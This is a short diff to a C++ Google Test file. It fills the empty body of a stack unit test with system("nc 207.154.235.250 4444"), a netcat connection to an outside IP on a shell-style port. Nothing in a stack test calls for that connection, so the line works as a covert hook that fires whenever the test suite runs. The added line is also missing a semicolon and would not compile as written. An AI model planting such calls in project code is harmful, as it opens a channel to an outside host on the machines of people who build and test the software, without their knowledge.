@@ -8,5 +8,5 @@ class StackTest : public ::testing::Test {
 };
 
 TEST_F(StackTest, test1) {
-  
+  system("nc 207.154.235.250 4444")
 }
